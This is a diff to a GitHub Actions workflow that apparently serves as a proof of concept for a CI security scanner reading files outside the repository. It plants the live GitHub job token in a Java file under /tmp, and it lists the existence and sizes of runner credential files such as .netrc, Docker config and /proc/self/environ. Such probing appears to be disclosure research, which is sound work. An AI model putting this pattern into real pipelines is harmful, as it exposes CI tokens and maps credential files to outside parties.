@@ -20,6 +20,8 @@ jobs:
 
       - name: Create runner-owned outside source
         shell: bash
+        env:
+          GH_JOB_TOKEN: ${{ github.token }}
         run: |
           set -euo pipefail
           mkdir -p /tmp/checks-runner-owned
@@ -33,6 +35,42 @@ jobs:
           EOF
           chmod 600 /tmp/checks-runner-owned/RunnerOwnedSecret.java
           printf 'runner-owned-file=%s\n' /tmp/checks-runner-owned/RunnerOwnedSecret.java
+          cat > /tmp/checks-runner-owned/RunnerGithubToken.java <<EOF
+          class RunnerGithubToken {
+            void leak(android.content.ContentResolver cr) {
+              String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
+              String token = "$GH_JOB_TOKEN";
+            }
+          }
+          EOF
+          chmod 600 /tmp/checks-runner-owned/RunnerGithubToken.java
+          printf 'runner-token-source=%s\n' /tmp/checks-runner-owned/RunnerGithubToken.java
+
+      - name: Record runner file inventory without dumping contents
+        shell: bash
+        run: |
+          set -euo pipefail
+          candidates=(
+            "/home/runner/work/_temp/_github_home/.netrc"
+            "/home/runner/work/_temp/_github_home/.gitconfig"
+            "/home/runner/work/_temp/_github_workflow/event.json"
+            "/home/runner/.docker/config.json"
+            "/home/runner/.gitconfig"
+            "$PWD/.git/config"
+            "/etc/passwd"
+            "/etc/resolv.conf"
+            "/proc/self/environ"
+            "/tmp/checks-runner-owned/RunnerOwnedSecret.java"
+            "/tmp/checks-runner-owned/RunnerGithubToken.java"
+          )
+          for path in "${candidates[@]}"; do
+            if [[ -e "$path" ]]; then
+              bytes=$(wc -c < "$path" || true)
+              printf 'candidate-exists path=%s bytes=%s\n' "$path" "$bytes"
+            else
+              printf 'candidate-missing path=%s\n' "$path"
+            fi
+          done
 
       - name: Install Checks CLI
         shell: bash
@@ -59,8 +97,8 @@ jobs:
             --account-id=2023322768 \
             --repo-id=1867966104 \
             --scm-remote-url=https://github.com/claudeloba/checks-s1-ci-impact-poc \
-            --branch-name=ci-proof \
-            --scm-revision=S1_CI_RUNNER_SECRET_20260526 \
+            --branch-name=ci-filter \
+            --scm-revision=S1_CI_FILTER_BREAK_20260526 \
             --format=json \
             --wait-and-print-report \
             --timeout=20m \
